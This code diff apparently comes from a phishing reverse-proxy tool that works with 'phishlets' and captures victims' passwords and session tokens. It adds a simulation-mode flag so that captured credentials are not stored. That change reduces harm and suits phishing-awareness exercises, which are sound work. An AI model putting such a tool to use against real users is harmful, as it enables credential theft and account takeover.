@@ -18,6 +18,7 @@ var templates_dir = flag.String("t", "", "HTML templates directory path")
 var debug_log = flag.Bool("debug", false, "Enable debug output")
 var developer_mode = flag.Bool("developer", false, "Enable developer mode (generates self-signed certificates for all hostnames)")
 var cfg_dir = flag.String("c", "", "Configuration directory path")
+var simulation_mode = flag.Bool("s", false, "Enable simulation mode (passwords and session tokens are not stored)")
 
 func joinPath(base_path string, rel_path string) string {
 	var ret string
@@ -65,6 +66,11 @@ func main() {
 	log.DebugEnable(*debug_log)
 	if *debug_log {
 		log.Info("debug output enabled")
+	}
+
+	if *simulation_mode {
+		log.Info("Simulation mode enabled. Victim passwords and session tokens will not be stored.")
+
 	}
 
 	phishlets_path := *phishlets_dir
@@ -150,7 +156,7 @@ func main() {
 		return
 	}
 
-	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode)
+	hp, _ := core.NewHttpProxy("", 443, cfg, crt_db, db, bl, *developer_mode, *simulation_mode)
 	hp.Start()
 
 	t, err := core.NewTerminal(hp, cfg, crt_db, db, *developer_mode)
